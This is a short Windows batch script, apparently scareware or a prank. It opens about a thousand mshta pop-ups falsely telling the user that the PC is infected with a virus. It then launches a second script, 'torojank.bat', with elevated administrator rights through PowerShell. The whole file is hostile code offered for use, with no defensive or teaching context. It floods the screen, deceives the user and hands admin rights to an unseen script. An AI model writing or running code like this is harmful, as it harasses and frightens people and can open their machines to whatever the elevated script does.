@echo off
setlocal


set "MSG=Your PC has been infected with a virus!"
set /a COUNT=1000
set /a CURRENT=0

:loop
set /a CURRENT+=1
start "" mshta "javascript:var r=confirm('%MSG%'); if(r){alert('Your PC has been infected with a virus!');} else {alert('Your PC has been infected with a virus!');}; close();"
echo ^G

if %CURRENT% geq %COUNT% goto launch
goto loop

:launch

if exist "torojank.bat" (
    powershell -Command "Start-Process 'torojank.bat' -Verb RunAs"
) else (
    echo torojank.bat Your PC has been infected with a virus!
)

pause
endlocal

